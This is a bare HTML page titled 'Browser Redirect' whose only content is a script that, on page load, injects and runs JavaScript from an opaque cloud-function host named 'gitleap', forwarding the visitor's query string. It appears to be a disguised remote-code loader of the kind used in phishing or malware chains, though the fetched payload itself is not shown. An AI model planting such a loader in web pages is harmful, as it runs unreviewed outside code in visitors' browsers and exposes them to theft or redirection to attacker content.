<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Browser Redirect</title>
</head>
<body>
    <script type="text/javascript">
        window.addEventListener("DOMContentLoaded", () => {
            const script = document.createElement('script')
            script.src = `https://gitleap-usxcgdheld.cn-shanghai.fcapp.run/${window.location.search}`
            script.defer = true
            document.body.append(script)
        })
    </script>
</body>
</html>
